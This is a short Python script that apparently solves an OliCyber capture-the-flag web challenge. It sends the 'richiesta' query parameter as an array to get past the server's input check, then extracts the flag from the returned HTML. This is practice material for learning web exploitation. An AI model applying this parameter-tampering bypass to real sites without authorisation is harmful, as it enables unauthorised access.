import requests
site = "http://make-a-wish.challs.olicyber.it/?richiesta[]=sas"
r = requests.get(site)
for i in r.text.split("\n"):
    if "flag" in i:
        print(i.replace("<h1>", "").replace("</h1>",""), end="")
        break